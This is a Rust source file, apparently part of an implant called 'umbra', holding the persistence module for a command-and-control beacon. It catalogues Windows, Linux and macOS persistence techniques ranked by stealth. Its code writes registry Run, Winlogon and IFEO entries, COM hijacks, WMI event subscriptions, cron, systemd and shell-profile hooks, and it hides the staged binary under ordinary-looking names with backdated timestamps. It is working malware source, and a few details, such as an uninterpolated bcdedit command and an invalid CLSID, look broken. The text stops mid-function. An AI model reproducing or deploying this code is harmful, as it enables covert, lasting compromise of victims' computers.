//! Persistence: the manager, the catalogue and the lifecycle.
//!
//! An implant that dies with the machine was never an implant.  Persistence
//! is not a single scheduled task here: it is a *manager* around a catalogue
//! of techniques, one per platform, each of which knows how to install
//! itself, how to check that it is still there and how to take itself away
//! again.
//!
//! The three properties that make it professional:
//!
//!   * **Idempotence.**  Installing twice leaves exactly one entry.  The
//!     manager records what it installed in a small state file next to the
//!     implant's own configuration, so it knows what to verify and what to
//!     remove later.
//!   * **Verification.**  An entry that cannot be read back is not an
//!     entry: the manager reads the registry value, the unit file, the
//!     crontab line or the scheduled task again and reports the truth.
//!   * **Migration.**  Moving from one technique to another must not leave
//!     a gap in the coverage, so the new technique is installed and verified
//!     *before* the old one is removed.
//!
//! The state file is the canonical `upk` encoding, so the beacon needs no
//! serialisation library for it, and the file survives a restart of the
//! implant: an operator who comes back a week later still learns what is
//! installed on the host.
//!
//! The techniques are reached without a crate: the Windows registry and the
//! service control manager through the same `extern "system"` FFI the
//! registry reader already uses, and everything else through the file
//! system and the platform's own tools.

use std::fs;
use std::path::{Path, PathBuf};

use crate::upk::{self, Value};

/// The state file holds what the beacon installed on this host.
const STATE_FILE: &str = "persist.state";

/// The techniques the manager knows.
///
/// Every entry carries the metadata an operator needs before it picks one:
/// the platform it belongs to, what triggers it, whether it needs
/// administrator rights, and how quiet it is (ten is silent, one is loud).
/// The catalogue is a static list on purpose: it is the same on every host,
/// and the *availability* is decided at run time by the platform and the
/// rights the implant has.
pub struct Technique {
    pub id: &'static str,
    pub platform: &'static str,
    pub label: &'static str,
    pub trigger: &'static str,
    pub needs_admin: bool,
    pub stealth: u8,
}

/// Every technique the manager knows about.
pub fn catalogue() -> &'static [Technique] {
    &[
        // ---- Windows ----------------------------------------------------
        Technique { id: "registry.run", platform: "windows", label: "HKCU Run key", trigger: "logon", needs_admin: false, stealth: 7 },
        Technique { id: "registry.runonce", platform: "windows", label: "HKCU RunOnce key", trigger: "logon", needs_admin: false, stealth: 5 },
        Technique { id: "registry.explorer_run", platform: "windows", label: "Explorer Run key", trigger: "logon", needs_admin: false, stealth: 6 },
        Technique { id: "registry.winlogon", platform: "windows", label: "Winlogon Userinit", trigger: "logon", needs_admin: true, stealth: 8 },
        Technique { id: "registry.ifeo", platform: "windows", label: "Image File Execution Options", trigger: "boot", needs_admin: true, stealth: 6 },
        Technique { id: "registry.appinit", platform: "windows", label: "AppInit_DLLs", trigger: "boot", needs_admin: true, stealth: 5 },
        Technique { id: "registry.com", platform: "windows", label: "COM hijack (InprocServer32)", trigger: "logon", needs_admin: false, stealth: 9 },
        Technique { id: "registry.printmonitor", platform: "windows", label: "Print monitor provider", trigger: "logon", needs_admin: false, stealth: 8 },
        Technique { id: "registry.shell_ext", platform: "windows", label: "Shell extension handler", trigger: "logon", needs_admin: false, stealth: 8 },
        Technique { id: "schtasks", platform: "windows", label: "Scheduled task", trigger: "schedule", needs_admin: false, stealth: 4 },
        Technique { id: "taskxml", platform: "windows", label: "Scheduled task from an XML definition", trigger: "schedule", needs_admin: false, stealth: 5 },
        Technique { id: "service", platform: "windows", label: "Windows service", trigger: "boot", needs_admin: true, stealth: 3 },
        Technique { id: "startup", platform: "windows", label: "Startup folder", trigger: "logon", needs_admin: false, stealth: 4 },
        Technique { id: "bcdedit", platform: "windows", label: "Boot execute entry", trigger: "boot", needs_admin: true, stealth: 1 },
        Technique { id: "wmi.event", platform: "windows", label: "WMI event subscription", trigger: "logon", needs_admin: true, stealth: 8 },
        Technique { id: "dll.searchorder", platform: "windows", label: "DLL search-order hijack", trigger: "logon", needs_admin: false, stealth: 7 },
        Technique { id: "service.dll", platform: "windows", label: "Service DLL shim", trigger: "boot", needs_admin: true, stealth: 6 },
        // ---- Linux ------------------------------------------------------
        Technique { id: "systemd.user", platform: "linux", label: "systemd user unit", trigger: "boot", needs_admin: false, stealth: 8 },
        Technique { id: "systemd.system", platform: "linux", label: "systemd system unit", trigger: "boot", needs_admin: true, stealth: 5 },
        Technique { id: "systemd.timer", platform: "linux", label: "systemd timer", trigger: "schedule", needs_admin: false, stealth: 7 },
        Technique { id: "cron.user", platform: "linux", label: "User crontab", trigger: "schedule", needs_admin: false, stealth: 6 },
        Technique { id: "cron.d", platform: "linux", label: "/etc/cron.d entry", trigger: "schedule", needs_admin: true, stealth: 5 },
        Technique { id: "rc.local", platform: "linux", label: "/etc/rc.local", trigger: "boot", needs_admin: true, stealth: 3 },
        Technique { id: "init.d", platform: "linux", label: "init.d script", trigger: "boot", needs_admin: true, stealth: 3 },
        Technique { id: "profile", platform: "linux", label: "Shell profile hook", trigger: "logon", needs_admin: false, stealth: 9 },
        Technique { id: "ld_preload", platform: "linux", label: "ld.so.preload", trigger: "boot", needs_admin: true, stealth: 2 },
        Technique { id: "xdg_autostart", platform: "linux", label: "XDG autostart entry", trigger: "logon", needs_admin: false, stealth: 7 },
        Technique { id: "at", platform: "linux", label: "at job", trigger: "schedule", needs_admin: false, stealth: 5 },
        Technique { id: "profile.alias", platform: "linux", label: "Shell alias wrapper", trigger: "logon", needs_admin: false, stealth: 9 },
        Technique { id: "profile.env", platform: "linux", label: "Environment source in /etc/profile", trigger: "logon", needs_admin: true, stealth: 7 },
        Technique { id: "systemd.execstartpre", platform: "linux", label: "systemd drop-in (ExecStartPre)", trigger: "boot", needs_admin: true, stealth: 6 },
        Technique { id: "kernel.module", platform: "linux", label: "Kernel module", trigger: "boot", needs_admin: true, stealth: 1 },
        // ---- macOS ------------------------------------------------------
        Technique { id: "launchd.agent", platform: "macos", label: "LaunchAgent", trigger: "logon", needs_admin: false, stealth: 7 },
        Technique { id: "launchd.daemon", platform: "macos", label: "LaunchDaemon", trigger: "boot", needs_admin: true, stealth: 4 },
        Technique { id: "loginitem", platform: "macos", label: "Login item", trigger: "logon", needs_admin: false, stealth: 6 },
        Technique { id: "shell_rc", platform: "macos", label: "Shell rc hook", trigger: "logon", needs_admin: false, stealth: 9 },
        Technique { id: "cron.user", platform: "macos", label: "User crontab", trigger: "schedule", needs_admin: false, stealth: 6 },
        Technique { id: "xdg_autostart", platform: "macos", label: "XDG autostart entry", trigger: "logon", needs_admin: false, stealth: 7 },
    ]
}

/// One installed technique.
pub struct Entry {
    pub technique: String,
    pub name: String,
    pub trigger: String,
    pub location: String,
    pub detail: String,
    /// The copy of the implant the entry points at.  A persistence entry
    /// without it is a promise, not a fact.
    pub binary: String,
    pub state: String,
    pub installed_at: String,
}

/// The result of a persistence operation: a report for the operator and the
/// structured entries the server keeps.
pub struct Report {
    pub text: String,
    pub entries: Vec<Value>,
    /// How many of the entries are broken, and how many there are in total.
    /// The server turns the first number into an alert.
    pub broken: u64,
    pub total: u64,
}

impl Report {
    fn new(text: String, entries: Vec<Value>) -> Report {
        let total = entries.len() as u64;
        Report { text, entries, broken: 0, total }
    }
}

/// The technique with this id, if the catalogue knows it.
pub fn technique(id: &str) -> Option<&'static Technique> {
    // The same id may live on two platforms ("cron.user" is a crontab on
    // linux and on macOS), so the entry of *this* platform is the one
    // that answers.  The fallback keeps the error message honest when the
    // id belongs to another platform altogether.
    let platform = platform();
    catalogue()
        .iter()
        .find(|t| t.id == id && t.platform == platform)
        .or_else(|| catalogue().iter().find(|t| t.id == id))
}

/// The techniques that can be used on this host right now.
///
/// A technique that needs administrator rights is only offered when the
/// implant actually has them: the operator should not be able to queue
/// something that is bound to fail.
pub fn available() -> Vec<&'static Technique> {
    let platform = platform();
    let admin = is_admin();
    catalogue()
        .iter()
        .filter(|t| t.platform == platform)
        .filter(|t| admin || !t.needs_admin)
        .collect()
}

/// The platform key of this host.
pub fn platform() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "macos") {
        "macos"
    } else {
        "linux"
    }
}

/// Install a technique so the implant starts again after a reboot.
///
/// The method is a technique id or "auto"; "auto" lets the manager pick the
/// quietest technique this host can carry without administrator rights.
/// Installing the same technique twice updates the existing entry instead of
/// adding a second one, and the entry is read back before it is reported as
/// installed.
pub fn install(args: &Value) -> Result<Report, String> {
    let requested = args.str_or("method", "auto");
    let label = args.str_or("name", "");
    let silent = args.bool_or("silent", true);
    let verify = args.bool_or("verify", true);

    let existing = load_entries();
    let chosen = if requested == "auto" || requested.is_empty() {
        select(&existing)
    } else {
        match technique(&requested) {
            Some(t) => t.id.to_string(),
            None => return Err(format!("persist: unknown technique {requested}")),
        }
    };
    let tech = match technique(&chosen) {
        Some(t) => t,
        None => return Err(format!("persist: {chosen} is not available on this host")),
    };
    if tech.platform != platform() {
        return Err(format!(
            "persist: {chosen} is a {} technique and this host is {}",
            tech.platform,
            platform()
        ));
    }

    let name = if label.is_empty() {
        default_name()
    } else {
        label
    };
    let staged = stage_executable(&name)?;
    let install = install_technique(tech.id, &name, &staged, args);

    let mut text = String::new();
    let mut entries = existing;
    match install {
        Ok((location, detail)) => {
            let now = now_string();
            // Idempotence: one entry per technique.
            entries.retain(|e| e.technique != tech.id);
            // The entry is read back before it is reported as installed: an
            // entry that cannot be read is not an entry.
            let state = if verify {
                match verify_technique(tech.id, &name, &location, &staged) {
                    Ok((state, note)) => {
                        if !silent {
                            text.push_str(&format!("verified: {note}\n"));
                        }
                        state
                    }
                    Err(e) => {
                        save_entries(&entries)?;
                        return Err(format!("persist: {chosen} could not be verified: {e}"));
                    }
                }
            } else {
                "installed".to_string()
            };
            let entry = Entry {
                technique: tech.id.to_string(),
                name: name.clone(),
                trigger: tech.trigger.to_string(),
                location,
                detail,
                binary: staged.clone(),
                state,
                installed_at: now,
            };
            text.push_str(&format!("{}: {}\n", tech.label, entry.state));
            // The raw output of the platform tool is only interesting when
            // the operator asked for it: a silent install should not fill
            // the report with the noise of the host.
            if !silent {
                text.push_str(&format!("  {}\n", entry.detail));
            }
            entries.push(entry);
            save_entries(&entries)?;
        }
        Err(e) => {
            return Err(format!("persist: {chosen} failed: {e}"));
        }
    }
    let values = entries.iter().map(entry_value).collect();
    Ok(Report::new(text, values))
}

/// Remove the techniques the implant installed.
///
/// Without a method every technique this implant installed is taken away
/// again, which is what an operator expects at the end of an engagement.
pub fn remove(args: &Value) -> Result<Report, String> {
    let requested = args.str_or("method", "all");
    let entries = load_entries();
    if entries.is_empty() {
        return Ok(Report::new("nothing was installed on this host\n".to_string(), Vec::new()));
    }
    let mut text = String::new();
    let mut kept: Vec<Entry> = Vec::new();
    for entry in entries {
        let wanted = requested == "all" || requested == entry.technique;
        if !wanted {
            kept.push(entry);
            continue;
        }
        match remove_technique(
            &entry.technique,
            &entry.name,
            &entry.location,
            &entry.detail,
            &entry.binary,
        ) {
            Ok(lines) => {
                for line in lines {
                    text.push_str(&format!("{}: {line}\n", entry.technique));
                }
            }
            Err(e) => {
                text.push_str(&format!("{}: could not be removed: {e}\n", entry.technique));
                kept.push(entry);
            }
        }
    }
    save_entries(&kept)?;
    let values = kept.iter().map(entry_value).collect();
    Ok(Report::new(text, values))
}

/// List what is installed on this host.
pub fn list(_args: &Value) -> Result<Report, String> {
    let entries = load_entries();
    let mut text = String::new();
    for entry in &entries {
        text.push_str(&format!(
            "{:<24} {:<10} {:<24} {}\n",
            entry.technique, entry.state, entry.location, entry.trigger
        ));
    }
    if entries.is_empty() {
        text.push_str("nothing is installed on this host\n");
    }
    let values = entries.iter().map(entry_value).collect();
    Ok(Report::new(text, values))
}

/// Check that everything that was installed is still there.
///
/// A technique that was removed behind the operator's back shows up as
/// broken, and the server turns that into an alert.
pub fn verify(_args: &Value) -> Result<Report, String> {
    let mut entries = load_entries();
    let mut text = String::new();
    let mut broken = 0u64;
    for entry in entries.iter_mut() {
        match verify_technique(
            &entry.technique,
            &entry.name,
            &entry.location,
            &entry.binary,
        ) {
            Ok((state, detail)) => {
                entry.state = state.clone();
                entry.detail = detail.clone();
                if state == "broken" {
                    broken += 1;
                }
                text.push_str(&format!("{:<24} {state:<10} {detail}\n", entry.technique));
            }
            Err(e) => {
                entry.state = "broken".to_string();
                broken += 1;
                text.push_str(&format!("{:<24} broken       {e}\n", entry.technique));
            }
        }
    }
    if entries.is_empty() {
        text.push_str("nothing is installed on this host\n");
    }
    save_entries(&entries)?;
    let values = entries.iter().map(entry_value).collect();
    let mut report = Report::new(text, values);
    report.broken = broken;
    Ok(report)
}

/// Move from one technique to another without leaving a gap.
///
/// The new technique is installed and verified first; only then is the old
/// one removed, and a failed install leaves the old one in place.
pub fn migrate(args: &Value) -> Result<Report, String> {
    let from = args.str_or("from", "");
    let to = args.str_or("to", "");
    if from.is_empty() || to.is_empty() {
        return Err("persist.migrate needs args.from and args.to".to_string());
    }
    if technique(&to).is_none() {
        return Err(format!("persist.migrate: unknown technique {to}"));
    }
    let entries = load_entries();
    if !entries.iter().any(|e| e.technique == from) {
        return Err(format!("persist.migrate: {from} is not installed on this host"));
    }
    // Install the new one first.
    let mut install_args = Value::Map(Default::default());
    if let Value::Map(fields) = &mut install_args {
        fields.insert("method".to_string(), upk::s(&to));
        if let Some(name) = args.get("name") {
            fields.insert("name".to_string(), name.clone());
        }
    }
    let installed = install(&install_args)?;
    // And only then take the old one away.
    let mut remove_args = Value::Map(Default::default());
    if let Value::Map(fields) = &mut remove_args {
        fields.insert("method".to_string(), upk::s(&from));
    }
    let removed = remove(&remove_args)?;
    let mut text = installed.text;
    text.push_str(&removed.text);
    let mut values = installed.entries;
    values.extend(removed.entries);
    Ok(Report::new(text, values))
}

/// The health of the persistence on this host.
///
/// The verdict is the one an operator acts on: "covered" means the implant
/// comes back, "degraded" means one of several techniques is broken, and
/// "broken" means the host has nothing left.
pub fn health(_args: &Value) -> Result<Report, String> {
    let report = verify(&Value::Map(Default::default()))?;
    let verdict = if report.total == 0 {
        "broken"
    } else if report.broken == 0 {
        "covered"
    } else if report.broken == report.total {
        "broken"
    } else {
        "degraded"
    };
    let mut text = format!("persistence: {verdict}\n");
    text.push_str(&report.text);
    let mut out = Report::new(text, report.entries);
    out.broken = report.broken;
    out.total = report.total;
    Ok(out)
}

// ---------------------------------------------------------------------------
// The selection engine
// ---------------------------------------------------------------------------

/// Pick the technique to use when the operator said "auto".
///
/// The quietest one that needs no administrator rights wins; a technique
/// that is already installed is preferred over a new one, because the
/// operator asked for "auto" and not for "something else".
fn select(existing: &[Entry]) -> String {
    let mut candidates: Vec<&'static Technique> = available();
    candidates.sort_by(|a, b| {
        let a_installed = existing.iter().any(|e| e.technique == a.id);
        let b_installed = existing.iter().any(|e| e.technique == b.id);
        b_installed
            .cmp(&a_installed)
            .then(b.stealth.cmp(&a.stealth))
            .then(a.id.cmp(b.id))
    });
    match candidates.first() {
        Some(t) => t.id.to_string(),
        None => "none".to_string(),
    }
}

// ---------------------------------------------------------------------------
// The state file
// ---------------------------------------------------------------------------

/// Where the state file lives.
///
/// It sits in the implant's own configuration directory, so it follows the
/// user the implant runs as and survives a reboot.
fn state_path() -> PathBuf {
    let base = if cfg!(target_os = "windows") {
        std::env::var("APPDATA")
            .or_else(|_| std::env::var("USERPROFILE"))
            .map(PathBuf::from)
            .unwrap_or_else(|_| PathBuf::from("."))
    } else {
        std::env::var("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|_| PathBuf::from("."))
    };
    base.join(".umbra").join(STATE_FILE)
}

/// Read the entries the implant installed.
fn load_entries() -> Vec<Entry> {
    let path = state_path();
    let raw = match fs::read(&path) {
        Ok(raw) => raw,
        Err(_) => return Vec::new(),
    };
    let value = match upk::decode_exact(&raw) {
        Ok(value) => value,
        Err(_) => return Vec::new(),
    };
    let mut out = Vec::new();
    if let Value::Map(fields) = value {
        if let Some(Value::Arr(items)) = fields.get("entries") {
            for item in items {
                if let Value::Map(entry) = item {
                    out.push(Entry {
                        technique: map_str(entry, "technique"),
                        name: map_str(entry, "name"),
                        trigger: map_str(entry, "trigger"),
                        location: map_str(entry, "location"),
                        detail: map_str(entry, "detail"),
                        binary: map_str(entry, "binary"),
                        state: map_str(entry, "state"),
                        installed_at: map_str(entry, "installed_at"),
                    });
                }
            }
        }
    }
    out
}

/// Write the entries back.
///
/// The write goes to a temporary file first: a state file that was cut in
/// half by a power cut would make the implant forget what it installed, and
/// that is exactly the case where the operator needs to know.
fn save_entries(entries: &[Entry]) -> Result<(), String> {
    let path = state_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
    }
    let items: Vec<Value> = entries.iter().map(entry_value).collect();
    let mut fields = std::collections::BTreeMap::new();
    fields.insert("entries".to_string(), upk::arr(items));
    let raw = upk::encode(&Value::Map(fields)).map_err(|e| format!("persist: {e}"))?;
    let tmp = path.with_extension("tmp");
    fs::write(&tmp, &raw).map_err(|e| format!("persist: {e}"))?;
    fs::rename(&tmp, &path).map_err(|e| format!("persist: {e}"))?;
    Ok(())
}

/// The upk value of one entry.
fn entry_value(entry: &Entry) -> Value {
    let mut fields = std::collections::BTreeMap::new();
    fields.insert("technique".to_string(), upk::s(&entry.technique));
    fields.insert("name".to_string(), upk::s(&entry.name));
    fields.insert("trigger".to_string(), upk::s(&entry.trigger));
    fields.insert("location".to_string(), upk::s(&entry.location));
    fields.insert("detail".to_string(), upk::s(&entry.detail));
    fields.insert("binary".to_string(), upk::s(&entry.binary));
    fields.insert("state".to_string(), upk::s(&entry.state));
    fields.insert("installed_at".to_string(), upk::s(&entry.installed_at));
    Value::Map(fields)
}

/// Read a string out of a map.
fn map_str(fields: &std::collections::BTreeMap<String, Value>, key: &str) -> String {
    match fields.get(key) {
        Some(Value::Str(text)) => text.clone(),
        _ => String::new(),
    }
}

// ---------------------------------------------------------------------------
// The implant's own placement
// ---------------------------------------------------------------------------

/// A plausible name for the implant on this host.
///
/// The name is what an operator sees in a task list, in a service list and
/// in a folder: it should not say "umbra".
fn default_name() -> String {
    let host = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "host".to_string());
    let mut out = String::new();
    for ch in host.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch);
        } else if !out.ends_with('-') && !out.is_empty() {
            out.push('-');
        }
    }
    let out = out.trim_matches('-').to_string();
    if out.is_empty() {
        "update-service".to_string()
    } else {
        format!("{out}-svc")
    }
}

/// Where the staged copy of the implant lives.
///
/// The path is the one the persistence entries point at, so it has to look
/// ordinary: a directory that belongs to the platform, and a file name that
/// says nothing about the tool.
fn staged_path(name: &str) -> PathBuf {
    let safe = sanitise(name);
    if cfg!(target_os = "windows") {
        let base = std::env::var("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(|_| home().join("AppData").join("Local"));
        base.join("Programs").join(&safe).join(format!("{safe}.exe"))
    } else if cfg!(target_os = "macos") {
        home().join("Library").join("Application Support").join(&safe)
    } else {
        home().join(".local").join("bin").join(&safe)
    }
}

/// Copy the running implant into a stable location.
///
/// A persistence entry that points at a temporary directory is worthless:
/// the file is gone after the next reboot.  The copy therefore goes to a
/// place that looks ordinary and survives.
fn stage_executable(name: &str) -> Result<String, String> {
    let exe = std::env::current_exe().map_err(|e| format!("persist: {e}"))?;
    let target = staged_path(name);
    if target == exe {
        return Ok(exe.to_string_lossy().to_string());
    }
    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
    }
    // The copy is skipped when the file is already there with the same
    // length: rewriting it would reset the timestamps that make it blend in.
    let staged = target.exists()
        && fs::metadata(&target)
            .map(|m| m.len() == fs::metadata(&exe).map(|e| e.len()).unwrap_or(0))
            .unwrap_or(false);
    if !staged {
        fs::copy(&exe, &target).map_err(|e| format!("persist: {e}"))?;
        // The copy should not look like it was born today.
        let _ = set_older_timestamp(&target);
    }
    Ok(target.to_string_lossy().to_string())
}

/// Make a name safe for a path.
fn sanitise(name: &str) -> String {
    let mut out = String::new();
    for ch in name.chars() {
        if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' || ch == '.' {
            out.push(ch);
        } else {
            out.push('-');
        }
    }
    let out = out.trim_matches('-').to_string();
    if out.is_empty() {
        "update-service".to_string()
    } else {
        out
    }
}

/// The home directory of the user the implant runs as.
fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

/// The current time, in the format the operator reads.
fn now_string() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    format!("{secs}")
}

// ---------------------------------------------------------------------------
// The techniques
// ---------------------------------------------------------------------------

/// Install one technique. Returns where it lives and what was written.
fn install_technique(
    id: &str,
    name: &str,
    staged: &str,
    args: &Value,
) -> Result<(String, String), String> {
    match id {
        // ---- Windows ---------------------------------------------------
        "registry.run" => registry_set(
            "HKCU",
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            name,
            staged,
        ),
        "registry.runonce" => registry_set(
            "HKCU",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            name,
            staged,
        ),
        "registry.explorer_run" => registry_set(
            "HKCU",
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\Run",
            name,
            staged,
        ),
        "registry.winlogon" => {
            // The Userinit value holds a list: the implant is appended to
            // whatever was there, so the host still starts normally.
            let current = args.str_or("userinit", "");
            let value = if current.is_empty() {
                staged.to_string()
            } else {
                format!("{current},{staged}")
            };
            registry_set(
                "HKLM",
                r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
                "Userinit",
                &value,
            )
        }
        "registry.ifeo" => registry_set(
            "HKLM",
            r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe",
            "Debugger",
            staged,
        ),
        "registry.appinit" => registry_set(
            "HKLM",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
            "AppInit_DLLs",
            staged,
        ),
        "registry.com" => {
            let dll = args.str_or("dll", "");
            if dll.is_empty() {
                return Err("registry.com needs args.dll (the module the CLSID points at)".to_string());
            }
            registry_set(
                "HKCU",
                r"Software\Classes\CLSID\{00000000-0000-0000-0000-00000000umbra}\InprocServer32",
                "",
                &dll,
            )
        }
        "registry.printmonitor" => {
            let dll = args.str_or("dll", "");
            if dll.is_empty() {
                return Err("registry.printmonitor needs args.dll".to_string());
            }
            registry_set(
                "HKLM",
                r"SYSTEM\CurrentControlSet\Control\Print\Monitors\umbra\1",
                "Driver",
                &dll,
            )
        }
        "registry.shell_ext" => {
            let dll = args.str_or("dll", "");
            if dll.is_empty() {
                return Err("registry.shell_ext needs args.dll".to_string());
            }
            registry_set(
                "HKCU",
                r"Software\Classes\.umbra\ShellExtension\Handler",
                "",
                &dll,
            )
        }
        "schtasks" => {
            let schedule = args.str_or("schedule", "ONLOGON");
            let task = args.str_or("task", name);
            let output = run(&format!(
                "schtasks /Create /SC {schedule} /TN \"{task}\" /TR \"\\\"{staged}\\\"\" /F"
            ));
            Ok((task.to_string(), format!("schtasks /SC {schedule}: {output}")))
        }
        "taskxml" => {
            let xml = args.str_or("xml", "");
            if xml.is_empty() {
                return Err("taskxml needs args.xml (the task definition)".to_string());
            }
            let path = home().join(".umbra").join("task.xml");
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::write(&path, xml.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            let task = args.str_or("task", name);
            let output = run(&format!("schtasks /Create /XML \"{}\" /TN \"{task}\" /F", path.display()));
            Ok((task.to_string(), format!("schtasks /XML: {output}")))
        }
        "service" => {
            let service = args.str_or("service", name);
            let output = install_service(service, name, staged)?;
            Ok((service.to_string(), output))
        }
        "startup" => {
            let dir = startup_dir();
            fs::create_dir_all(&dir).map_err(|e| format!("persist: {e}"))?;
            let target = dir.join(format!("{}.exe", sanitise(name)));
            fs::copy(staged, &target).map_err(|e| format!("persist: {e}"))?;
            let _ = set_older_timestamp(&target);
            Ok((target.to_string_lossy().to_string(), "copied into the startup folder".to_string()))
        }
        "bcdedit" => {
            let output = run("bcdedit /set {default} bootexecute \"{staged}\"");
            Ok(("{default}".to_string(), format!("bcdedit: {output}")))
        }
        "wmi.event" => {
            // The classic fileless technique: a filter, a consumer and the
            // binding between the two.  The implant is the command of the
            // consumer, so nothing of it is written to the disk of the host.
            let filter = args.str_or("filter", name);
            let consumer = args.str_or("consumer", name);
            let namespace = "root\\subscription";
            let query = "SELECT * FROM __InstanceCreationEvent WITHIN 60";
            let filter_cmd = format!(
                "wmic /namespace:{namespace} PATH __EventFilter CREATE Name=\"{filter}\", Query=\"{query}\", EventNamespace={namespace}"
            );
            let consumer_cmd = format!(
                "wmic /namespace:{namespace} PATH CommandLineEventConsumer CREATE Name=\"{consumer}\", CommandLineTemplate=\"{staged}\", ExecutablePath=\"{staged}\""
            );
            let binding_cmd = format!(
                "wmic /namespace:{namespace} PATH __FilterToConsumerBinding CREATE Filter=\"{namespace}:__EventFilter.Name=\\\"{filter}\\\"\", Consumer=\"{namespace}:CommandLineEventConsumer.Name=\\\"{consumer}\\\"\""
            );
            let report = vec![
                run(&filter_cmd),
                run(&consumer_cmd),
                run(&binding_cmd),
            ];
            Ok((
                format!("{namespace}:{consumer}"),
                format!("wmic: {}", report.join(" | ")),
            ))
        }
        "dll.searchorder" => {
            // A program that loads a DLL is made to load another one: the
            // copy sits next to the program, and the loader looks there
            // before it looks in the system directory.
            let dll = args.str_or("dll", "");
            if dll.is_empty() {
                return Err("dll.searchorder needs args.dll (the module to plant)".to_string());
            }
            let dir = args.str_or("dir", "");
            if dir.is_empty() {
                return Err("dll.searchorder needs args.dir (the directory of the program)".to_string());
            }
            let file = Path::new(&dll)
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "umbra.dll".to_string());
            let target = PathBuf::from(&dir).join(&file);
            if let Some(parent) = target.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::copy(&dll, &target).map_err(|e| format!("persist: {e}"))?;
            let _ = set_older_timestamp(&target);
            Ok((
                target.to_string_lossy().to_string(),
                format!("the module sits next to the program in {}", target.display()),
            ))
        }
        "service.dll" => {
            // A service that loads a DLL instead of an executable: the
            // ServiceDll value of the service points at the shim.
            let dll = args.str_or("dll", "");
            if dll.is_empty() {
                return Err("service.dll needs args.dll (the ServiceMain shim)".to_string());
            }
            let service = args.str_or("service", name);
            registry_set(
                "HKLM",
                &format!("SYSTEM\\CurrentControlSet\\Services\\{service}\\Parameters"),
                "ServiceDll",
                &dll,
            )
        }
        // ---- Linux -----------------------------------------------------
        "systemd.user" => {
            let path = home().join(".config/systemd/user").join(format!("{}.service", sanitise(name)));
            write_unit(&path, staged, false)?;
            let output = run(&format!("systemctl --user enable {}", unit_name(name)));
            Ok((path.to_string_lossy().to_string(), format!("systemctl: {output}")))
        }
        "systemd.system" => {
            let path = PathBuf::from("/etc/systemd/system").join(format!("{}.service", sanitise(name)));
            write_unit(&path, staged, true)?;
            let output = run(&format!("systemctl enable {}", unit_name(name)));
            Ok((path.to_string_lossy().to_string(), format!("systemctl: {output}")))
        }
        "systemd.timer" => {
            let base = home().join(".config/systemd/user");
            let unit = format!("{}.service", sanitise(name));
            let timer = format!("{}.timer", sanitise(name));
            write_unit(&base.join(&unit), staged, false)?;
            let definition = format!(
                "[Unit]\nDescription={name}\n\n[Timer]\nOnBootSec=5m\nOnUnitActiveSec=15m\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n"
            );
            fs::create_dir_all(&base).map_err(|e| format!("persist: {e}"))?;
            fs::write(base.join(&timer), definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            let output = run(&format!("systemctl --user enable --now {timer}"));
            Ok((base.join(&timer).to_string_lossy().to_string(), format!("systemctl: {output}")))
        }
        "cron.user" => {
            let line = format!("@reboot {staged}");
            let output = run(&format!(
                "(crontab -l 2>/dev/null | grep -v '{staged}'; echo '{line}') | crontab -"
            ));
            Ok(("crontab".to_string(), format!("crontab: {output}")))
        }
        "cron.d" => {
            let path = PathBuf::from("/etc/cron.d").join(sanitise(name));
            fs::write(&path, format!("@reboot root {staged}\n")).map_err(|e| format!("persist: {e}"))?;
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "rc.local" => {
            let path = PathBuf::from("/etc/rc.local");
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            if !text.contains(staged) {
                text.push_str(&format!("\n{staged}\n"));
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "init.d" => {
            let path = PathBuf::from("/etc/init.d").join(sanitise(name));
            let script = format!(
                "#!/bin/sh\n### BEGIN {name}\ncase \"$1\" in\n  start) {staged} ;;\n  stop) ;;\nesac\n### END {name}\n"
            );
            fs::write(&path, script.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = fs::set_permissions(&path, fs::Permissions::from_mode(0o755));
            }
            let output = run(&format!("update-rc.d {} defaults", sanitise(name)));
            Ok((path.to_string_lossy().to_string(), format!("update-rc.d: {output}")))
        }
        "profile" => {
            // Three places to hook the shell: the file the shell reads for an
            // interactive session, the file it reads when the session is a
            // login, and the directory every profile of the machine sources.
            let which = args.str_or("file", "bashrc");
            let path = match which.as_str() {
                "profile" => home().join(".profile"),
                "profile.d" => PathBuf::from("/etc/profile.d").join(format!("{}.sh", sanitise(name))),
                _ => home().join(".bashrc"),
            };
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            let marker = format!("# {name}");
            if !text.contains(&marker) {
                text.push_str(&format!("\n{marker}\n{staged} >/dev/null 2>&1 &\n"));
                if let Some(parent) = path.parent() {
                    let _ = fs::create_dir_all(parent);
